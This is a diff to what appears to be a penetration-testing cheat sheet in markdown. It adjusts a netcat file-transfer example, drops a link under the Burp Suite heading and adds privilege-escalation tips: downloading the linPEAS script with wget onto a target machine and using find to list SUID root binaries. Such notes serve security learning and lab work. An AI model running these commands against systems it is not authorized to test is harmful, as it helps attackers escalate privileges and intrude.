@@ -344,7 +344,7 @@ Netcat aka nc is an extremely versatile tool. It allows users to connect to spec
 
 ### Syntax
 Computer B (acts as the receiving server):  
-`nc -l -p 6790 > testfile.txt`  
+`nc -lvnp 6790 > testfile.txt`  
 Computer A (acts as the sending client):  
 `nc [IP address of computer B] 6790 < testfile.txt`  
 
@@ -416,8 +416,7 @@ Only open ports = `--open`
 Scan an IPv6 address = `-6` 
 
 # Tools (GUI) 
-## Burp
-https://twitter.com/Pethuraj/status/1399408069377880064/photo/1  
+## Burp 
 Burp Suite, a framework of web application pentesting tools, is widely regarded as the de facto tool to use when performing web app testing
 
 ### Setting up Burp Suite
@@ -660,6 +659,14 @@ Run: `id`
 Run: `sudo -l`  
 Locate password folder and crack it using johntheripper  
 Or use [GTFOBins](https://gtfobins.github.io)
+
+You can also run:  
+wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh on a target machine to see the files that stand out.
+
+Another option would be to run the following command:  
+`find / -user root -perm 4000 -print 2>/dev/null`
+
+`2>/dev/null` will filter out the errors so that they will not be output to your console
 
 ## Phishing
 
